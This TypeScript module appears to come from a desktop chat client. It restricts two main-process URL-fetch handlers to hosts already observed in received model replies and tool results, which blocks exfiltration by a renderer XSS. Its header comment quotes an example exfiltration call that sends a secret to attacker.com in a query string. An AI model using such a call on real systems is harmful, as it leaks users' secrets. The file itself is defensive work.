/**
 * SECURITY (audit M4): a host allow-list for the two main-process fetch sinks that take a
 * RENDERER-supplied URL — `files:fetch-url` (download a tool-returned export) and
 * `links:preview` (OpenGraph unfurl of a link in a message).
 *
 * The renderer's own egress is locked down by a strict CSP `connect-src`, but these two IPC
 * handlers let the renderer make main fetch an ARBITRARY public URL — and the outbound GET
 * carries its query string BEFORE any response validation. A renderer XSS could therefore do
 * `files.fetchUrl("https://attacker.com/?d=" + secret)` and exfiltrate straight through the
 * CSP. `safeFetch` blocks private/internal hosts (SSRF) but not arbitrary PUBLIC hosts.
 *
 * Fix: main only fetches a URL whose HOST it has independently OBSERVED in content it
 * RECEIVED — the streamed model reply and MCP tool results. It is deliberately NOT seeded
 * from OUTGOING renderer message text (audit M4 hardening): that text is renderer-supplied,
 * so a renderer XSS could inject `attacker.com` there to whitelist it (fail-open). An
 * attacker host in a fabricated query string was thus never observed → refused (fail
 * closed). This is a boundary enforced in MAIN (the renderer is untrusted): the renderer's
 * `linkPreviews` opt-in remains a UX gate, but the exfiltration boundary lives here.
 * Residual: previewing a link the user only ever TYPED (never received) needs a future
 * explicit per-URL user grant.
 */

// Bounded, insertion-ordered. Hosts are not secrets — this caps unbounded growth, evicting
// the oldest observed host once full (a Map preserves insertion order).
const MAX_HOSTS = 1000;
const hosts = new Map<string, true>();

function add(host: string): void {
  if (!host) return;
  hosts.delete(host); // refresh recency
  hosts.set(host, true);
  if (hosts.size > MAX_HOSTS) {
    const oldest = hosts.keys().next().value;
    if (oldest !== undefined) hosts.delete(oldest);
  }
}

function hostOf(urlStr: string): string | null {
  try {
    return new URL(urlStr).hostname.toLowerCase() || null;
  } catch {
    return null;
  }
}

// URLs embedded in free text. Bounded per call so a huge tool result can't spin the regex.
const URL_RE = /\bhttps?:\/\/[^\s<>"')\]]+/gi;

/** Record every http(s) host appearing in a blob of text main relayed (message / reply /
 *  tool result). Silently no-ops on non-strings. */
export function noteFetchHostsFromText(text: unknown): void {
  if (typeof text !== "string" || !text) return;
  let m: RegExpExecArray | null;
  let n = 0;
  URL_RE.lastIndex = 0;
  while ((m = URL_RE.exec(text)) && n++ < 200) {
    const h = hostOf(m[0]);
    if (h) add(h);
  }
}

/** Record a single URL's host (e.g. an attachment/export URL surfaced structurally). */
export function noteFetchHost(urlStr: string): void {
  const h = hostOf(urlStr);
  if (h) add(h);
}

/** True only when `urlStr`'s host was previously observed in relayed content. A malformed
 *  URL, or an unseen host, returns false (fail closed → the caller refuses the fetch). */
export function isFetchHostAllowed(urlStr: string): boolean {
  const h = hostOf(urlStr);
  return h != null && hosts.has(h);
}

/** Test-only: clear the observed set. */
export function _resetFetchAllow(): void {
  hosts.clear();
}
